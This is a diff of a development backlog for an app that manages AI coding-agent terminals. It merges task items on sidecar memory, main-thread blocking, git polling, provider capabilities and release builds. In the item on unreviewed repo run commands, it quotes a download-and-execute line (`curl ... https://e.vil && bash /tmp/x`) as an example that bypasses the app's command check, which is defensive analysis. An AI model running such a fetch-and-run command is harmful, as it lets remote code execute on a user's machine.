 8. **Reattach replays up to 8MB ring snapshot through `callbacks.onData`** (`pty-host.ts` ~146):
    ~100-150ms blocking per live agent at startup, and it re-fires old status/OSC signals. Write the
    snapshot to the emulator only and seed the scrollback buffer tail directly.
-9. **`projects.listAllWorktrees` calls sync napi `worktreeHasChanges` per worktree** on the main
-   thread (10ms/worktree here, est 150ms+ on 10k files). Use a napi AsyncTask or async git status.
-10. **GitPane / SmartGitAction / TerminalPanel poll git status + `gh pr view` every 15s**: refetch on
-    turn-end / commit / push events instead.
+   > Merged from the T184 reattach-replay leftover, T185.14 rest, T184.2 rest and the
+   > `COMPETITIVE_UPDATE_2026_10.md` P2 "per-session flow control" on 2026-10-04.
+   - (T184 leftover) `pty-host.ts` reattach hands the sidecar's raw snapshot to the renderer; the
+     other replays go through the serializer (`getLiveSnapshot`). Sending the serialized snapshot
+     there too would make the sidecar's `stripTerminalQueries` unnecessary (no bump to drop it)
+   - (T185.14 rest, review #9) Sidecar memory pressure: ring eviction only touches idle sessions
+     (33 active rings = 264 MiB > 256 MiB target). Byte counting and the client backlog cap
+     shipped 2026-10-01 (`TASK_COMPLETED/2610.md`). Bumps SIDECAR_VERSION.
+   - (T184.2 rest) Queries while the app runs but no view draws the session: the sidecar answers
+     DA1 only while no client is connected (app closed). With the app open, a hidden pane's xterm
+     may not answer, and OSC 10/11/12 colour queries are never answered from the sidecar (T183.1
+     terminal fidelity answers them in the renderer only). Needs main to tell the sidecar which
+     sessions have a live view.
+   - (P2) Renderer-acked, per-session flow control: `OutputGate` pauses every PTY when one socket
+     backs up (terax `pty/output.rs`, klaudio 10d1e70).
+10. **Polls**: GitPane / SmartGitAction / TerminalPanel poll git status + `gh pr view` every 15s;
+    refetch on turn-end / commit / push events instead. The PR poll part is shared with T142.
+    > Merged from the "Queue after 0.5.7" performance follow-ups (0.5.3 audit) on 2026-10-04.
+    - `diff.gitState` every 15s per GitPane spawns 4 git + `gh pr view` (network): poll the PR on
+      its own 2-5 min interval and invalidate after push/commit; `diff.status` repeats its git status
+    - Polls keep running while the window is unfocused and hidden panes stay mounted: wire
+      TanStack `focusManager` to window blur/focus and `enabled: isVisible` on pane queries
+    - `FloatingBrowser` polls `agents.list` every 5s (shared key makes it win over 30s)
 
 **From the 2026-09-05 review (reproduced there, confirmed still in code 2026-09-22)**
 11. **Scheduler timeout double-records and frees capacity early** (#3): the 10-min timeout
@@ -520,16 +385,18 @@ exchange-bus MVP only, no headless council executions. Absorbs:
     the agent, and a later finish logs `success` for the same run. Stored `maxTokenBudget` and
     `skillName` never reach spawn options; a full concurrency slot returns without a durable
     deferred run. Separate task from run; persist queue, attempt and terminal state; close each run
-    once. Prerequisite for T132.
+    once. Prerequisite for the T153 automations catalog (was T132).
+    > Merged from T185.1 on 2026-10-04.
+    - (was 1) **Scheduler has no UI** since 274e611 (SchedulerSection deleted); the sidebar
+      Schedulers section was removed in the 2026-09-22 PR. Create/edit/toggle/run UI missing; hooks
+      in `renderer/hooks/use-trpc-scheduler.ts` unused.
 12. **Embeddings: a failed call leaves a permanent hole, and a model change never invalidates**
     (#4, #5): `indexProject` stores the file hash before the vector, so a `null` embedding is never
     retried; the cache compares content hash only, and `cosineSimilarity` truncates to the shorter
     dimension. Persist model id, dimension and chunker version per index generation. Before T153.
 13. **Indexer ignores `.gitignore`** (#6): `walkDir` (`project-indexer.ts`) only applies its own
     exclude list. Symlinks are no longer followed (fe7e264). Use git-aware enumeration.
-14. **Sidecar memory pressure** (#9, rest): ring eviction only touches idle sessions (33 active
-    rings = 264 MiB > 256 MiB target). Byte counting and the client backlog cap shipped 2026-10-01
-    (`TASK_COMPLETED/2610.md`). Bumps SIDECAR_VERSION.
+14. Sidecar memory pressure (rest): merged into 8.
 15. **Memory salience reinforces a negation** (#7, P1 for T158/T164): `classifyObservation`
     (`salience.ts:51,61`) reinforces "Always run migrations…" with "Never run migrations…" (word
     similarity > 0.8). Auto-dedup only exact normalized matches; supersession needs an explicit
@@ -539,11 +406,32 @@ exchange-bus MVP only, no headless council executions. Absorbs:
 16. **Settings defined three times**: the `Settings` type, `settingsSchema` defaults and
     `DEFAULT_SETTINGS` drift (that is how zod stripped the Ollama keys). Make
     `Settings = z.infer<typeof settingsSchema>` and `DEFAULT_SETTINGS = settingsSchema.parse({})`;
-    reconcile `agentClis` (schema `[]`, constant 4 entries) first.
+    reconcile `agentClis` (schema `[]`, constant 4 entries) first; nothing reads it (2026-09-28
+    audit nit, merged 2026-10-04).
 17. **Other untyped CustomEvents**: `switch-section` is typed now (`lib/switch-section.ts`); give
     `spawn-agent` and the rest a typed `WindowEventMap` so detail keys are checked at both ends.
 18. **One apply-status helper**: status dedup covers the parser path only; the other 7
     `broadcastAgentStatus` callers still write the DB and broadcast on repeats.
+
+**Main process off the hot path** (P1, Priority Order #4)
+19. Everything that blocks the main thread on a polled or per-flush path.
+    > Merged from T185.6, T185.7, T185.9 and the "Queue after 0.5.7" search and main-process
+    > follow-ups (#151 simplify pass, 0.5.3 audit) on 2026-10-04.
+    - (was 6) **Tokens tab Scan** (`tokens/log-parser.ts`) is sync `readFileSync` + `JSON.parse`
+      over `~/.claude/projects`: 2.1s freeze at ~1GB. Move to a worker_thread or stream with
+      mtime skip. Same for the sync log scan in `tokens.scan`
+    - (was 7) **Headless xterm serialize on main** (`headless-emulator.ts:69`), 25-40ms per 5000
+      lines: runs on every 5s scrollback flush per agent even when idle (add a dirty flag), and
+      twice per pane mount (`use-terminal-lifecycle.ts` fetches a full snapshot to test
+      non-empty, `terminal-setup.ts` fetches again). Sync `emulator.snapshot()` per scrollback flush
+    - (was 9) **`projects.listAllWorktrees` calls sync napi `worktreeHasChanges` per worktree** on
+      the main thread (10ms/worktree here, est 150ms+ on 10k files). Use a napi AsyncTask or
+      async git status
+    - Sync napi `getDiff`/`getWorktreeDiff` on polled paths
+    - `appendFileSync` per log line
+    - Search: `fsSearch`/`fsGrep` are sync napi calls run per folder on the main process (fine at
+      3-10ms per repo, a freeze on a 30-repo workspace); make them `AsyncTask` and give the Rust
+      walker a nested-`.git` scope instead of the per-folder loop
 
 ---
 
@@ -551,28 +439,65 @@ exchange-bus MVP only, no headless council executions. Absorbs:
 **Priority**: P1 for items 1-13 | **Effort**: varies | **Source**: 48 repos (spark tag `exegol`),
 two waves. Evidence, P2 and P3 items: `docs/RESEARCH/COMPETITIVE_UPDATE_2026_10.md`.
 
-Quick ones first (S): 1. pre-trust the folder before spawning (orca); 2. strip the launching
-session's markers (CLAUDECODE, CLAUDE_CODE_CHILD_SESSION...) from the child env (klaudio);
-3. per-pane error boundary (superset); 11. bundled orchestration skills on our MCP tools (paseo);
-13. send diff comments to the agent (emdash).
+Quick ones first (S):
+1. Pre-trust the folder before spawning (orca).
+   > Merged from T182.3 (`added: 2026-08-19`) on 2026-10-04: **repo-authored run commands have no
+   > review step.** `inspectCommand` on `.exegol/actions.yaml` is a seatbelt, not a boundary: a
+   > `Makefile` target or a `package.json` script reaches the PTY without it, and even in
+   > actions.yaml `curl -o /tmp/x https://e.vil && bash /tmp/x` passes. The honest fix is one
+   > "this repo defines N run commands, review them" confirmation covering every source,
+   > remembered per repo (one per-repo trust step together with the folder pre-trust).
+2. Strip the launching session's markers (CLAUDECODE, CLAUDE_CODE_CHILD_SESSION...) from the
+   child env (klaudio).
+3. Per-pane error boundary (superset).
+11. Bundled orchestration skills on our MCP tools (paseo).
+13. Send diff comments to the agent (emdash).
 
-Then (S-M / M): 4. follow-up queue + steer; 5. per-turn snapshot, "changes this turn", Undo turn
-(extends T129); 6. answer agent questions from the Dashboard / notification (PermissionRequest
-hook body, `ask_user` MCP tool); 7. react to PR checks, reviews and conflicts (next to T142);
-8. plan usage meter (5h / weekly, reset); 9. hooks for Codex and other CLIs, session id from the
-hook (T191); 10. stuck-agent watchdog ladder; 12. agent-driven UI over MCP (`pane_open`,
-`notify`).
+Then (S-M / M):
+4. Follow-up queue + steer.
+5. Per-turn snapshot, "changes this turn", Undo turn (extends T129).
+   > Merged from T179.2 (`added: 2026-08-13`) on 2026-10-04: **per-file local history** as a view
+   > over the same snapshots. Athas keeps per-file snapshots with `reason: save | auto-save |
+   > restore | manual`, content hash, size, and restore-with-diff (`local-history-api.ts`). More
+   > valuable for us because AGENTS edit the files: the oplog stores git trees per operation, so
+   > there is no way to open one file and see its timeline after an agent touched it.
+6. Answer agent questions from the Dashboard / notification (PermissionRequest hook body,
+   `ask_user` MCP tool). T133 (remote channel) depends on this.
+   > Merged from T171 (`added: 2026-08-13`) on 2026-10-04: **signed authorization over the agent
+   > bus.** When a step genuinely needs the user, the bus has no way to carry an authorization the
+   > receiver can verify (draco refused Juanito's word and stayed blocked until Antonio went to its
+   > terminal by hand). An agent escalates through the channel; the user approves once from
+   > Exegol (NotificationBus + Attention Inbox); the receiver gets an authorization **signed by
+   > Exegol**, never relayed by the requesting agent. Pairs with T169's ownership question. A
+   > human → agent send from the Dashboard thread needs a sender Exegol verifies (the removed
+   > `messages.send` accepted any sender and never delivered).
+7. React to PR checks, reviews and conflicts: merged into T142 on 2026-10-04.
+8. Plan usage meter (5h / weekly, reset). Priority Order #1: status bar with agents per CLI,
+   Claude plan usage + reset, Codex rate limits.
+9. Hooks for Codex and other CLIs, session id from the hook: extends T191. Already there: codex
+   `hooks.json` is merged globally by `agents/wrappers.ts`; Claude's session id from the hook
+   shipped in #124.
+10. Stuck-agent watchdog ladder.
+    > Merged from T184.15 (`added: 2026-08-22`) on 2026-10-04: **a CLI's own journal is a
+    > liveness signal, not just history.** clay writes a turn as `"pending"` BEFORE the request and
+    > rewrites it after, so a trailing `pending` means "running right now": scrape-free,
+    > ANSI-immune. Extends T181's store readers from "what happened" to "what is happening".
+12. Agent-driven UI over MCP (`pane_open`, `notify`).
 
-### T195 — Distribution: universal build `added: 2026-09-24`
+### T195 — Distribution: universal build `added: 2026-04-15`
+> Merged from T45 (CI/CD release pipeline, `added: 2026-04-15`) and T193.3 on 2026-10-04. T195
+> itself was added 2026-09-24.
+
 **Priority**: P2 | **Effort**: M
 
 Notarization (since 0.5.4) and GitHub releases are done. The build is still arm64 only.
 2. Universal build (Intel + Apple Silicon): core-rust for `x86_64-apple-darwin` too, the
    `@libsql/darwin-x64` binary (not installed today), node-pty x64; `target: universal` or two DMGs.
+   (T193.3: arm64 only, `core-rust.darwin-arm64.node`, no `@libsql/darwin-x64`.)
 4. Validate on someone else's Intel and Apple Silicon Mac: downloaded DMG opens with no warning;
    auto-update goes from one release to the next.
-5. Build note: after `bun install --frozen-lockfile` electron-vite's nested esbuild binary went
-   missing (`write EPIPE` at config load); `bun install --force` restored it. Check in CI.
+6. (was T45) Validation CI shipped (`.github/workflows/ci.yml`, PR #115). Remaining: tag-triggered
+   package + release workflow, signing secrets (see `GUIDES/RELEASE.md`).
 
 ### T193 — v0.5.0 pre-build audit leftovers `added: 2026-09-22`
 **Priority**: P1 unless noted | **Source**: 2026-09-22 pre-build audit. Fixed items are in `TASK_COMPLETED/2609.md`.
@@ -581,7 +506,7 @@ Notarization (since 0.5.4) and GitHub releases are done. The build is still arm6
 2. `process.execPath` is written into hooks, `.mcp.json` and CLI configs: launching from the DMG
    volume or a translocated path breaks them once the app moves. Install to /Applications first;
    long term, rewrite those paths at startup when execPath changed.
-3. arm64 only (`core-rust.darwin-arm64.node`, no `@libsql/darwin-x64`). P2.
+3. arm64 only: merged into T195.2.
 4. node-pty `prebuilds/darwin-arm64/spawn-helper` has no exec bit; works only because
    `rebuild:native` builds `build/Release/spawn-helper`. chmod in an afterPack hook.
 5. Dev and packaged share `~/.exegol` sidecar socket and pid (same SIDECAR_VERSION reuses each
@@ -596,7 +521,7 @@ Notarization (since 0.5.4) and GitHub releases are done. The build is still arm6
 10. `getAppSettings` falls back to defaults on bad JSON; the next update saves over the row.
 
 **Pipelines and git**
-12. `{{diff}}` (up to 16 MiB) goes into argv; over ~1MB the spawn fails. Pass via file (T183.11).
+12. `{{diff}}` in argv: merged into T183.11.
 13. Without core-rust (`dev:ui`) runs silently use the project root.
 14. Resume/Export pipeline mutations and Git stage/unstage have no onError; renamed or quoted
     paths break staging.
@@ -604,10 +529,9 @@ Notarization (since 0.5.4) and GitHub releases are done. The build is still arm6
     now visible as a toast). Pass the run's worktree path.
 
 **History, parallel, QA, files**
-16. History: opencode moved to SQLite (adapter reads JSON only); Gemini now uses `projects.json`
-    folder names (adapter reads hashed `tmp/`); no "resume from history" button.
-17. Parallel runs: no Cancel in the UI; if every spawn fails the run stays `running` forever.
-18. QA Run does nothing unless the browser pane is focused (`use-browser-qa.ts:252`).
+16. History adapters: merged into T191; the "resume from history" button is T181's "Resume from
+    history".
+17. Parallel runs Cancel / stuck `running`: merged into T185.3.
 21. Knowledge, Tasks and Add Memory swallow errors; archiving can overwrite `tasks_completed.md`
     (`task-file-actions.ts:40`).
 22. P2 debt: `trpcMutate<any>("agents.spawn")` x9; ~30 stale biome suppressions; unused renderer
@@ -616,7 +540,11 @@ Notarization (since 0.5.4) and GitHub releases are done. The build is still arm6
 
 ---
 
-### T191 — Provider capability descriptor `added: 2026-09-22`
+### T191 — Provider capability descriptor `added: 2026-08-11`
+> Merged from T161 (session naming, `added: 2026-08-11`), T175.6 and T193.16 on 2026-10-04.
+> T191 itself was added 2026-09-22. T200.9 (hooks for Codex and other CLIs, session id from the
+> hook) extends it.
+
 **Priority**: P2 | **Effort**: M | **Source**: merge of overlapping provider-knowledge items
 
 Per-provider behaviour lives in at least five hand-synced tables. Declare it once on the provider
@@ -627,8 +555,20 @@ definition in `agents/registry.ts` so custom providers get it too. Absorbs:
 - T181: `configDir` + `localHistory` (history readers, `skills/paths.ts`, `skills/importer.ts` and
   `agents/wrappers.ts` disagree: `"claude"` vs `"claude-code"`, two opencode dirs); `isEphemeral`
   instead of `cli_type === "shell"` in ~19 places
-- T161: `supportsSessionRename`, `resumeByName`
-- T175.6: `emitsTurnBoundaries`
+- T193.16 history adapters: opencode moved to SQLite (adapter reads JSON only); Gemini now uses
+  `projects.json` folder names (adapter reads hashed `tmp/`)
+- T161: `supportsSessionRename`, `resumeByName`. The spawn modal already offers resumable
+  sessions by alias (shipped 2026-08-13). Still open: claude and codex can NAME a session (their
+  own `rename`) and resume it BY that name (`claude --resume "<name>"`). Exegol keeps its
+  codename separate, so after a restart the user renames by hand in each terminal. When Exegol
+  assigns a codename, push it into the CLI's session name where supported and prefer name-based
+  resume over the captured resume command: one identity, and `agents_list` names survive outside
+  Exegol
+- T175.6: `emitsTurnBoundaries`. Composer-ready should come from the PTY emulator, not a second
+  parser: the round-7 `ESC[?2004h` sniff was removed (most TUIs enable it once at startup, so it
+  never fired, and it cost a hot-path scan). The `HeadlessEmulator` already parses this mode; a
+  `getBracketedPaste(id): boolean | null` accessor on PtyHost gives the tri-state if readiness
+  detection is wanted
 - T174: composer-ready marker + anchor per TUI
 - T172: expected behaviour (asks for authorization before sharing, etc.)
 
@@ -650,32 +590,23 @@ definition in `agents/registry.ts` so custom providers get it too. Absorbs:
 ---
 
 ### T184 — Learnings from fx, eve, pullfrog, openchamber and clay `added: 2026-08-22`
-**Priority**: P1 for items 2-5 (daily-readiness list) | **Effort**: varies | **Source**: 4-agent read
+**Priority**: P1 for item 5 (daily-readiness list) | **Effort**: varies | **Source**: 4-agent read
 of the repos Antonio brought + fx.sh docs. Clones under `_repos_2_learn/github.com/`. Every claim
-about OUR code below was reproduced before filing; two of the reviewers' claims did NOT reproduce
-and are recorded as refuted at the end.
+about OUR code below was reproduced before filing. The observability finding (14), the
+permissions framing, the refuted claims and the not-worth-copying list moved to
+`RESEARCH/COMPETITIVE_UPDATE_2026_08.md` on 2026-10-04.
 
 (Item 1, pipeline evidence lost once the agent commits, shipped 2026-09-22 in PR #115; see
-`TASK_COMPLETED/2609.md`.)
+`TASK_COMPLETED/2609.md`. Items 3-4 and the DA1 half of 2 shipped 2026-10-01; the rest of 2 and
+the reattach-replay leftover moved to T185.8.)
 
-**Latent bugs in the sidecar (openchamber).** Items 3-4 and the DA1 half of 2 shipped 2026-10-01
-(`fix/sidecar-batch`, see `TASK_COMPLETED/2610.md`). Left of item 2:
-
-2. **Queries while the app runs but no view draws the session.** The sidecar answers DA1 only while
-   no client is connected (app closed). With the app open, a hidden pane's xterm may not answer, and
-   OSC 10/11/12 colour queries are never answered from the sidecar (T183.1 answers them in the
-   renderer only). Needs main to tell the sidecar which sessions have a live view.
-
-Left from the simplify of that batch (judged out of its scope):
+Left from the simplify of the sidecar batch (judged out of its scope):
 - Process cleanup on close lives in main's `PtyHost.kill`; the sidecar's lease exit and SIGTERM
   handler still hang up only the shells. Move `terminalProcesses` + `terminateAll` into the
   sidecar with the next `SIDECAR_VERSION` bump
 - One kill-with-escalation helper for `terminateAll` and `killDevServer` (one pid-reuse guard)
 - The renderer's DB sync only adds agents: dropping ones the DB no longer has would make the
   store converge without relying on broadcasts
-- Reattach replay: `pty-host.ts` reattach hands the sidecar's raw snapshot to the renderer; the
-  other replays go through the serializer (`getLiveSnapshot`). Sending the serialized snapshot
-  there too would make the sidecar's `stripTerminalQueries` unnecessary (no bump to drop it)
 - Clear Terminal does not reach Dashboard mirror cards (they keep the old screen until a refit)
 
 **Spawn and lifecycle (pullfrog).**
@@ -683,17 +614,9 @@ Left from the simplify of that batch (judged out of its scope):
 5. **beforeAgent (rest)**: the terminal now says the hook failed and the agent starts anyway
    (TASK_COMPLETED 2026-09-24). Still missing: tell the agent in a `SETUP HOOK FAILED` prompt
    section, and a longer hook timeout (theirs 10 min, ours 2).
-6. **We check that an API key exists, never that it works** (pairs with T183.2: prefer the logged-in CLI, probe the key as fallback). `doctor.ts:339` tests for a non-empty
-   string, so a revoked key passes the doctor and fails inside a PTY at spawn. Their 40-line liveness
-   probe returns `alive | dead | unknown` with a 5s timeout, and only lists providers whose live-200
-   AND bad-key rejection have both been measured — `unknown` never rewrites a working config.
+6. API key liveness: merged into T183.2.
 7. Evaluator output is regex-scraped (`evaluator.ts:83-91`): moved to T192.
-8. **Merge PR has no guard.** `diff-pr.ts:51-52` defaults to `--squash` + `--delete-branch` (strategy is now a parameter) with no base-protection check; they refuse a
-   direct merge when the base is unprotected ("base branch not protected — refusing CI-ungated
-   merge") and prefer GitHub-native auto-merge with `expectedHeadOid`.
-9. **PR body is `--fill`** — body = commit messages, no footer, no link back to the agent run. Their
-   sentinel-delimited footer with strip-before-append makes PR-body updates idempotent, and records
-   which model ran and WHY a model was substituted.
+8. Merge PR guard and 9. PR body footer: merged into T142.
 10. **Stop-hook gate.** A 15-line bash hook curls a localhost server that can answer
     `{decision:"block", reason}` — the agent cannot end its turn with a dirty tree or an unmet
     contract. We already write per-agent hook settings AND already run a node binary from a PreToolUse
@@ -701,44 +624,8 @@ Left from the simplify of that batch (judged out of its scope):
 11. **Effort as a `[0,1]` position** mapped onto each CLI's own published ladder, always rounding
     DOWN so it can never cost more than asked. We have no effort concept at all.
 12. Lazy context (paths, not payloads): merged into T183.11.
-
-**Context budgeting (clay + monocode, same piece from two sides).**
-
-13. **Deterministic pre-compaction, ~30 lines and no API call** (same context-budget track as T183.1 occupancy): at 90% of budget keep the last N
-    turns whole and collapse older TOOL RESULTS to a marker. LLM summarization stays a manual user
-    action, and their reasoning is the part worth keeping: an automatic LLM compaction "risks failing
-    exactly when the context is already overloaded." We have no compaction logic at all — only
-    `diff-budget.ts` and a 2000-token memory cap.
-
-**Observability (clay).**
-
-14. **The state we scrape for is a first-class variable inside these CLIs and is never emitted.**
-    clay has `CLAY_APP_PROMPTING` with a state-change hook, and its own comment says the opaque slot
-    is "for the driver (the main loop today, an agent daemon later)". Confirms T123's hook approach is
-    the right shape and that scraping is what is left when a CLI exposes nothing.
-15. **A CLI's own journal is a liveness signal, not just history.** clay writes a turn as `"pending"`
-    BEFORE the request and rewrites it after, so a trailing `pending` means "running right now" —
-    scrape-free, ANSI-immune. Extends T181's store readers from "what happened" to "what is happening".
-
-**Permissions (fx).** Their model is worth adopting as a FRAMING: read/list/glob/search need no
-approval, only state-changing calls do, and an approval grants exactly the scope shown rather than a
-category. Our access modes are a sentence in the prompt plus an env var — not a gate. The T175 claim
-guard is the only thing that actually intercepts, and only for claude-code.
-
-**Refuted — recorded so nobody re-files them:**
-- *"History expansion breaks the spawn"*: measured on a real PTY with histexpand confirmed active
-  (control: `echo !e` expanded). `!`, `!important` and `!!` inside our quoted heredoc all pass, because
-  bash history-expands only the FIRST line of a command and our prompt text is always a continuation
-  line. Bracketed paste is on and we do not wrap the payload — fragile, not broken.
-- *"Spawn context is rebuilt uncached every spawn"*: the expensive part already is cached —
-  `skills/loader.ts:49` memoizes the per-skill `execSync` binary checks with a TTL. File reads and the
-  MCP tool context are rebuilt, which is cheap.
-
-**Explicitly NOT worth copying:** pullfrog's Linux/CI-only namespace sandbox (wrong threat model —
-our agent runs as the user on the user's machine) and its bot-identity commit authorship (T142 already
-ruled that out; single human identity keeps CODEOWNERS working); openchamber's five-surface matrix,
-12-locale i18n, client-side multi-run, and in-process server (our sidecar is why terminals survive a
-reload); clay's NULL-absorbing JSON accessors and first-word command allowlist.
+13. Deterministic pre-compaction: merged into T183.1.
+15. CLI journal as liveness signal: merged into T200.10.
 
 ---
 
@@ -761,6 +648,17 @@ below, context occupancy, is still open.)
    the window size is read from the CLI (`modelUsage[*].contextWindow`), never from a model table
    that goes stale. Ring in the terminal toolbar, amber 75% / red 90%.
    → `main/tokens/log-parser.ts`, `renderer/components/terminal/TerminalToolbar.tsx`, a wave migration.
+   > Merged from T184.13, the 2026-09-28 audit token-price nit and the `COMPETITIVE_UPDATE_2026_10.md`
+   > P2 "real cost from CLI events" on 2026-10-04 (one tokens and context track).
+   - (T184.13) **Deterministic pre-compaction, ~30 lines and no API call**: at 90% of budget keep
+     the last N turns whole and collapse older TOOL RESULTS to a marker. LLM summarization stays a
+     manual user action: an automatic LLM compaction "risks failing exactly when the context is
+     already overloaded" (clay + monocode). We have no compaction logic at all, only
+     `diff-budget.ts` and a 2000-token memory cap.
+   - (audit 2026-09-28) Costs are fixed at import from a hardcoded price table (the Pricing editor
+     changes only one table).
+   - (P2) Real cost from CLI events (claude `total_cost_usd`, codex events), stored as unknown,
+     never 0, when the CLI does not report it.
 2. **Four features are dark until the user pastes an API key**: `agents/scoring.ts`,
    `ipc/procedures/diff-ai.ts` (the Sparkles commit button), `pipeline/evaluator.ts`,
    `pipeline/evidence.ts` — all through `callAnthropicMessage` with `x-api-key`. monocode spawns the
@@ -769,6 +667,14 @@ below, context occupancy, is still open.)
    for commit messages, PR titles and branch names. No key, nothing to configure, no double payment.
    → new `main/lib/headless-claude.ts` behind the existing `callAnthropicMessage` signature, API key
    as fallback.
+   > Merged from T184.6 and the `COMPETITIVE_UPDATE_2026_10.md` P2 "credential verdicts" on 2026-10-04.
+   - (T184.6) **We check that an API key exists, never that it works.** `doctor.ts:339` tests for a
+     non-empty string, so a revoked key passes the doctor and fails inside a PTY at spawn.
+     pullfrog's 40-line liveness probe returns `alive | dead | unknown` with a 5s timeout, and only
+     lists providers whose live-200 AND bad-key rejection have both been measured; `unknown` never
+     rewrites a working config. Probe the key as the fallback path.
+   - (P2) Fault taxonomy and credential verdicts: "crashed" gets a cause; Doctor ranks a
+     subscription over an API key (pullfrog `providerErrors.ts`, `credentialPool.ts`).
 
 **The coordination gaps (mcp_agent_mail_rust).** Verified against our code, not taken on faith:
 
@@ -798,23 +704,15 @@ below, context occupancy, is still open.)
     worktree itself, with only a manifest of changed files and per-file diff hashes stored. Strictly
     less lossy, far cheaper in tokens, and survives a restart for free.
     → `main/pipeline/context.ts`, `pipeline-step-handler.ts`, `packages/shared/src/types/pipeline.ts`
+    > Merged from T193.12 on 2026-10-04: `{{diff}}` (up to 16 MiB) goes into argv; over ~1MB the
+    > spawn fails. Pass via file.
 12. Durable delegation outbox: moved to T170.3.
-13. **Cheap and worth copying now**: a static fan-out cap on any agent-spawns-agent path (theirs:
-    8 per parent, depth 1) and ONE documented canonical lock-acquisition order. We acquire worktree
-    locks, DB writes and sidecar RPCs in whatever order each call site needed.
+13. **One documented canonical lock-acquisition order.** We acquire worktree locks, DB writes and
+    sidecar RPCs in whatever order each call site needed. (The fan-out cap half was dropped
+    2026-10-04: no MCP tool spawns agents.)
 14. Durable judge verdicts: moved to T192.
 
-**Explicitly NOT worth copying:**
-- Their sender authentication is OFF by default and identity is a tmux-pane file with three legacy
-  fallbacks — a symptom of not owning the process. We mint a token at spawn and revoke on exit.
-- proliferate's workflow triggers: the README claims "recurring and event-driven" and there are NO
-  automated triggers of any kind — no cron, no webhook, no schedule column. Our `scheduler/engine.ts`
-  is ahead of them on this axis.
-- proliferate's intra-workspace concurrency: two in-process locks, no per-file arbitration at all.
-  Our path claims are the differentiated thing here — keep them.
-- 900k LOC for a mailbox, with a live Bayes-risk policy that can release other agents' reservations
-  on by default. Take the deadlock detector (Tarjan SCC over the conflict graph, surfaced as an
-  advisory notification), leave the rest.
+(The not-worth-copying list moved to `RESEARCH/COMPETITIVE_UPDATE_2026_08.md` on 2026-10-04.)
 
 ---
 
@@ -827,25 +725,17 @@ review are in `TASK_COMPLETED/2608.md`; these are the ones that need more than a
 
 1. `ppid` is client-supplied, so the process-tree fallback can name another agent: moved to T173.
 2. (Symlinked claim paths shipped 2026-08-19; the `pathsOverlap` residual moved to T175.4.)
-3. **Repo-authored run commands have no review step.** `inspectCommand` on
-   `.exegol/actions.yaml` is a seatbelt, not a boundary — a `Makefile` target or a
-   `package.json` script reaches the PTY without it, and even in actions.yaml
-   `curl -o /tmp/x https://e.vil && bash /tmp/x` passes. The honest fix is one "this repo
-   defines N run commands — review them" confirmation covering every source, remembered per
-   repo. (The comment no longer overclaims.)
+3. Repo-authored run commands review: merged into T200.1.
 4. **A `queued` message whose receiver's pane was closed reports `delivered: false` on
    retry** — `agent-messaging.ts#duplicateResult` → `getMessageEntry` returns undefined when
    either FK is NULL, and `messages` FKs are `ON DELETE SET NULL`. Closing a pane now archives
    rather than deletes (shipped), so this needs a real delete to trigger — but denormalizing
    the sender/receiver ids onto the message row would close it for good.
-5. **`identityMemo` never evicts** (`mcp/exegol-server.ts`) — keyed on a client-supplied pid,
-   overwritten but never deleted. Also never consulted on the path it was written for: the
-   claim guard deliberately sends no `ppid`. Either wire it to a bounded cache or delete it.
+5. `identityMemo`: merged into T173.
 6. **The MCP activity ring loses "connected but never spoke"** — `exegol-server.ts` announces
    a connection lazily on the first non-`check_path` message, so a shim that connects and dies
    before its first `list_tools` produces zero records. Announce on the first AUTHENTICATED
    message instead.
-7. (DB init failure guard shipped 2026-09-22; see `TASK_COMPLETED/2609.md`.)
 8. **`listSessionHistory` pagination has no pager yet** — the `, a.id DESC` tiebreaker shipped,
    but `history.list` still takes no `offset` and the UI has no paging. Add both together.
 
@@ -857,26 +747,22 @@ review are in `TASK_COMPLETED/2608.md`; these are the ones that need more than a
 Core shipped 2026-08-18 (see `TASK_COMPLETED/2608.md`): retention, the merged timeline, and
 local-store adapters for claude-code / codex / opencode. Remaining:
 
-- **Remaining providers have nothing to read** (surveyed 2026-08-19, see `TASK_COMPLETED`):
-  `crush` has a proper sessions table but zero rows and no cwd column; `amp` keeps only
-  file-change directories; `kiro`, `kilocode` and `devin` keep settings/extensions/plans and no
-  session store. Revisit `crush` if it starts being used — scoping would go through
-  `files.path`. Six adapters now cover every CLI that records anything.
 - **Resume from history.** The rows carry the provider's own session id; the launch modal
   already knows how to resume. A local session Exegol never launched is the interesting case.
-- **Purge UI.** Nothing is deleted automatically any more, and `oplog` stores git trees, so the
-  DB grows. There is no user-facing way to reclaim it — Settings needs a size readout and an
-  explicit "purge older than N".
-- **`shell` rows are still deleted at startup**, so a terminal tab never appears in history.
-  Correct today (no task, no score); revisit if plain terminals become worth remembering.
-  Deeper, from the round-9 simplify: the *trigger* is wrong. Every other part of the shell
-  lifecycle is handled at EXIT (`agent-session-callbacks.ts` skips scoring/memory/final_output;
-  the renderer store auto-cleans on final status). Delete the row where the shell ends and the
-  startup sweep disappears — it also currently runs before `runStartupRecovery`, whose
-  reattach has explicit handling for shells still alive in the sidecar.
-- **Retention has three homes and no statement of policy**: the shell delete and the
-  ANSI-memory delete in `cleanupStaleData`, plus `agent_events` at 30 days in
-  `notify-handler.ts`. One `db/retention.ts` declaring per-table policy, invoked once.
+- **Retention** (one sub-section: purge UI, policy file, shell rows). Merged 2026-10-04.
+  - **Purge UI.** Nothing is deleted automatically any more, and `oplog` stores git trees, so the
+    DB grows. There is no user-facing way to reclaim it: Settings needs a size readout and an
+    explicit "purge older than N".
+  - **One retention policy**: retention has three homes and no statement of policy: the shell
+    delete and the ANSI-memory delete in `cleanupStaleData`, plus `agent_events` at 30 days in
+    `notify-handler.ts`. One `db/retention.ts` declaring per-table policy, invoked once.
+  - **`shell` rows are still deleted at startup**, so a terminal tab never appears in history.
+    Correct today (no task, no score); revisit if plain terminals become worth remembering.
+    Deeper, from the round-9 simplify: the *trigger* is wrong. Every other part of the shell
+    lifecycle is handled at EXIT (`agent-session-callbacks.ts` skips scoring/memory/final_output;
+    the renderer store auto-cleans on final status). Delete the row where the shell ends and the
+    startup sweep disappears; it also currently runs before `runStartupRecovery`, whose
+    reattach has explicit handling for shells still alive in the sidecar.
 - `cli_type === "shell"` literal in ~19 places (`isEphemeral` capability): moved to T191.
 - **Derive `capabilities.json` instead of hand-maintaining it.** The parity test stops a
   procedure shipping dead, but it also makes the trpc half of the allowlist a copy of the
@@ -924,11 +810,7 @@ Real findings that needed more than a cleanup, so they were not folded into that
 5. **`warnIfCommittable` is a log line nobody reads** for a credential in the user's repo. The
    NotificationBus already carries `resource:warning`/`budget:warning`; this deserves the same.
